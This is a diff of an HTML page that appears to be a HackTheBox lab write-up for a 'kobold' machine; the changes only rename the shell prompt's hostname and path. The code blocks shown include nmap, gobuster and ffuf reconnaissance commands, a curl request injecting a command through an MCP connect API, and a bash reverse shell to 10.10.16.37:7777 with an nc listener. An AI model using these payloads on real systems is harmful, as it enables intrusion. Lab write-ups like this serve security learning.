@@ -272,7 +272,7 @@
               class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
               style="animation: border-breathe 4s ease-in-out infinite;" />
             <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
-              root@epangelinan: cd
+              root@pangelinan: cd
               <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
             </span>
           </a>
@@ -499,7 +499,7 @@
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# nmap -sC -sV -oN nmap_tcp.txt 10.129.54.53 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span></span></span></code></pre></div></div>
   </div>
 </div>
@@ -570,7 +570,7 @@ To find more directories/subdirectories, I ran a gobuster directory scan and an 
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# gobuster dir -u <span style="color:#e6db74">&#34;https://kobold.htb&#34;</span> -w ../SecLists/Discovery/Web-Content/common.txt -t <span style="color:#ae81ff">25</span> --timeout 20s</span></span></code></pre></div></div>
   </div>
 </div>
@@ -586,7 +586,7 @@ To find more directories/subdirectories, I ran a gobuster directory scan and an 
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ffuf -u https://kobold.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.kobold.htb&#34;</span> -w ../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac</span></span></code></pre></div></div>
   </div>
 </div>
@@ -614,7 +614,7 @@ So this:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# curl http://10.97.58.83:6274/api/mcp/connect --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --data <span style="color:#e6db74">&#34;{\&#34;serverConfig\&#34;:{\&#34;command\&#34;:\&#34;cmd.exe\&#34;,\&#34;args\&#34;:[\&#34;/c\&#34;, \&#34;calc\&#34;],\&#34;env\&#34;:{}},\&#34;serverId\&#34;:\&#34;mytest\&#34;}&#34;</span></span></span></code></pre></div></div>
   </div>
 </div>
@@ -631,7 +631,7 @@ So this:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# curl https://mcp.kobold.htb/api/mcp/connect --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --data <span style="color:#e6db74">&#39;{&#34;serverConfig&#34;:{&#34;command&#34;:&#34;/bin/bash&#34;,&#34;args&#34;:[&#34;-c&#34;, &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.37/7777 0&gt;&amp;1&#34;],&#34;env&#34;:{}},&#34;serverId&#34;:&#34;letmein&#34;}&#39;</span> -k</span></span></code></pre></div></div>
   </div>
 </div>
@@ -648,7 +648,7 @@ So this:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">7777</span>  
 </span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">7777</span> ...</span></span></code></pre></div></div>
   </div>
